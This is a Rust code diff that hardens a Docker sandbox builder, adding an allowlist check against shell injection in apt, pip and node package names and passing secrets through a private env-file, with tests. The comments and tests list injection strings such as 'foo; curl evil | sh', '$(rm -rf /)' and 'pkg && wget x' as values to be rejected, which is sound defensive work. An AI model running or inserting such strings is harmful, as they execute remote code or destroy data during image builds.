@@ -1,5 +1,5 @@
 use std::collections::HashMap;
-use std::path::Path;
+use std::path::{Path, PathBuf};
 use std::process::Command;
 
 use sha2::{Digest, Sha256};
@@ -20,6 +20,49 @@ pub fn generate_dockerfile(config: &RequiresConfig) -> WbResult<String> {
         )),
         other => Err(WbError::Sandbox(format!("unknown sandbox type: {}", other))),
     }
+}
+
+/// Characters allowed in an apt/pip/node package token: alphanumerics plus
+/// the punctuation needed for version specifiers, extras, and VCS/URL refs
+/// (`. _ + @ / : ~ ^ < > = ! -`). Everything else — spaces, `;`, `|`, `&`,
+/// `$`, backticks, quotes, parens, newlines — is rejected because these tokens
+/// are interpolated straight into `RUN apt-get install …` / `RUN uv pip install
+/// …` / `RUN npm install -g …` lines. For an untrusted workbook, frontmatter is
+/// attacker-controlled and the sandbox image build is the isolation boundary,
+/// so a token like `foo; curl evil | sh` must not be able to run during
+/// `docker build`.
+fn is_valid_package_token(token: &str) -> bool {
+    !token.is_empty()
+        && token.chars().all(|c| {
+            c.is_ascii_alphanumeric()
+                || matches!(
+                    c,
+                    '.' | '_' | '+' | '@' | '/' | ':' | '~' | '^' | '<' | '>' | '=' | '!' | '-'
+                )
+        })
+}
+
+/// Validate every apt/pip/node token in a requires config against the package
+/// allowlist (`is_valid_package_token`). Returns an error naming the offending
+/// list and token so the run fails fast — before any image is built — instead
+/// of allowing shell injection into the generated Dockerfile.
+pub fn validate_packages(config: &RequiresConfig) -> WbResult<()> {
+    for (label, list) in [
+        ("apt", &config.apt),
+        ("pip", &config.pip),
+        ("node", &config.node),
+    ] {
+        for token in list {
+            if !is_valid_package_token(token) {
+                return Err(WbError::Sandbox(format!(
+                    "invalid {label} package token {token:?}: only letters, digits, and \
+                     . _ + @ / : ~ ^ < > = ! - are allowed (rejected to prevent shell \
+                     injection during sandbox image build)"
+                )));
+            }
+        }
+    }
+    Ok(())
 }
 
 /// Install wb inside the container via the public installer.
@@ -145,6 +188,9 @@ pub fn image_exists(tag: &str) -> bool {
 
 /// Build a sandbox image. Returns the image tag on success.
 pub fn build_image(config: &RequiresConfig, workbook_dir: &str) -> WbResult<String> {
+    // Reject shell-metacharacter package tokens before doing any Docker work.
+    validate_packages(config)?;
+
     let tag = image_tag(config);
 
     if image_exists(&tag) {
@@ -284,12 +330,16 @@ pub fn run_in_sandbox(
 
     cmd.args(["-w", "/work"]);
 
-    // Pass environment variables
-    for (k, v) in env {
-        cmd.args(["-e", &format!("{}={}", k, v)]);
+    // Pass environment variables through a private (0600) env-file rather than
+    // `-e KEY=VALUE` argv. Secret values placed in argv are world-readable via
+    // /proc/<pid>/cmdline and surface in `docker inspect`; an env-file keeps
+    // them off the host process table. The file is removed after the run.
+    let env_file = write_container_env_file(env)?;
+    if let Some(ref path) = env_file {
+        cmd.args(["--env-file", &path.to_string_lossy()]);
     }
 
-    // Prevent sandbox recursion
+    // Prevent sandbox recursion (structural, non-secret — safe in argv).
     cmd.args(["-e", "WB_SANDBOX_INNER=1"]);
 
     cmd.arg(image_tag);
@@ -303,11 +353,53 @@ pub fn run_in_sandbox(
     cmd.stdout(std::process::Stdio::inherit());
     cmd.stderr(std::process::Stdio::inherit());
 
-    let status = cmd
-        .status()
-        .map_err(|e| WbError::Sandbox(format!("docker run: {}", e)))?;
+    let status = cmd.status();
+
+    // Best-effort removal of the secret-bearing env-file regardless of outcome.
+    if let Some(ref path) = env_file {
+        let _ = std::fs::remove_file(path);
+    }
+
+    let status = status.map_err(|e| WbError::Sandbox(format!("docker run: {}", e)))?;
 
     Ok(status.code().unwrap_or(-1))
+}
+
+/// Write the container env to a private temp file (mode 0600) for
+/// `docker run --env-file`, keeping secret values out of argv. Returns `None`
+/// when there's nothing to write.
+///
+/// `--env-file` is line-oriented (`KEY=VALUE` per line, no quoting/escaping),
+/// so a key/value that can't be represented on a single line is skipped with a
+/// warning rather than corrupting the file. Single-line secret values — the
+/// common case — pass through unchanged.
+fn write_container_env_file(env: &HashMap<String, String>) -> WbResult<Option<PathBuf>> {
+    if env.is_empty() {
+        return Ok(None);
+    }
+    let mut contents = String::new();
+    for (k, v) in env {
+        if k.is_empty() || k.contains('=') || k.contains('\n') || v.contains('\n') {
+            eprintln!("wb: sandbox: skipping env var {k:?} — not representable in --env-file");
+            continue;
+        }
+        contents.push_str(k);
+        contents.push('=');
+        contents.push_str(v);
+        contents.push('\n');
+    }
+    let nanos = std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .map(|d| d.as_nanos())
+        .unwrap_or(0);
+    let path = std::env::temp_dir().join(format!(
+        "wb-sandbox-env-{}-{}.env",
+        std::process::id(),
+        nanos
+    ));
+    crate::atomic_io::write_secret_file(&path, contents.as_bytes())
+        .map_err(|e| WbError::Sandbox(format!("write sandbox env-file: {}", e)))?;
+    Ok(Some(path))
 }
 
 /// List all wb-sandbox images.
@@ -639,6 +731,116 @@ mod tests {
         assert_eq!(prefix, "wb-sandbox");
         assert_eq!(short.len(), 12);
         assert!(short.chars().all(|c| c.is_ascii_hexdigit()));
+    }
+
+    #[test]
+    fn test_valid_package_token_accepts_names_and_version_specs() {
+        // Plain names, version specifiers, extras, scoped npm pkgs, VCS refs.
+        for ok in [
+            "qpdf",
+            "poppler-utils",
+            "python3-venv",
+            "pikepdf",
+            "requests==2.31.0",
+            "numpy>=1.26",
+            "django<5",
+            "package!=1.0",
+            "@browserbasehq/sdk",
+            "@scope/pkg@1.2.3",
+            "git+https://example.com/repo.git",
+            "pkg~=1.4",
+            "a.b_c+d",
+        ] {
+            assert!(is_valid_package_token(ok), "should accept {ok:?}");
+        }
+    }
+
+    #[test]
+    fn test_valid_package_token_rejects_shell_metacharacters() {
+        // Each of these would break out of the RUN command if interpolated.
+        for bad in [
+            "",
+            "foo;rm -rf /",
+            "foo bar",
+            "foo|bar",
+            "foo&bar",
+            "foo$(id)",
+            "foo`id`",
+            "foo\nbar",
+            "foo'bar",
+            "foo\"bar",
+            "$(curl evil)",
+            "pkg && wget x",
+            "pkg#comment",
+            "a(b)",
+        ] {
+            assert!(!is_valid_package_token(bad), "should reject {bad:?}");
+        }
+    }
+
+    #[test]
+    fn test_validate_packages_ok_for_clean_config() {
+        assert!(validate_packages(&python_config()).is_ok());
+        assert!(validate_packages(&node_config()).is_ok());
+    }
+
+    #[test]
+    fn test_validate_packages_rejects_injection_in_each_list() {
+        let mut apt_bad = python_config();
+        apt_bad.apt.push("evil; curl x | sh".to_string());
+        let err = validate_packages(&apt_bad).unwrap_err().to_string();
+        assert!(err.contains("apt"), "should name the apt list: {err}");
+
+        let mut pip_bad = python_config();
+        pip_bad.pip.push("$(rm -rf /)".to_string());
+        let err = validate_packages(&pip_bad).unwrap_err().to_string();
+        assert!(err.contains("pip"), "should name the pip list: {err}");
+
+        let mut node_bad = node_config();
+        node_bad.node.push("foo`id`".to_string());
+        let err = validate_packages(&node_bad).unwrap_err().to_string();
+        assert!(err.contains("node"), "should name the node list: {err}");
+    }
+
+    #[test]
+    fn test_build_image_rejects_injection_before_docker() {
+        // build_image must reject a malicious token up front (no Docker needed).
+        let mut config = python_config();
+        config.pip.push("evil; touch /tmp/pwned".to_string());
+        let err = build_image(&config, ".").unwrap_err().to_string();
+        assert!(
+            err.contains("injection") || err.contains("invalid"),
+            "{err}"
+        );
+    }
+
+    #[test]
+    fn test_write_container_env_file_roundtrips_and_skips_unrepresentable() {
+        let mut env = HashMap::new();
+        env.insert("TOKEN".to_string(), "secret-value".to_string());
+        env.insert("WITH_NEWLINE".to_string(), "a\nb".to_string());
+        let path = write_container_env_file(&env)
+            .expect("write ok")
+            .expect("some path");
+        let contents = std::fs::read_to_string(&path).unwrap();
+        assert!(contents.contains("TOKEN=secret-value"));
+        assert!(
+            !contents.contains("WITH_NEWLINE"),
+            "newline-bearing value must be skipped: {contents:?}"
+        );
+        #[cfg(unix)]
+        {
+            use std::os::unix::fs::PermissionsExt;
+            let mode = std::fs::metadata(&path).unwrap().permissions().mode() & 0o777;
+            assert_eq!(mode, 0o600, "env-file must be private, got {mode:o}");
+        }
+        let _ = std::fs::remove_file(&path);
+    }
+
+    #[test]
+    fn test_write_container_env_file_none_when_empty() {
+        let env = HashMap::new();
+        assert!(write_container_env_file(&env).unwrap().is_none());
     }
 
     #[test]
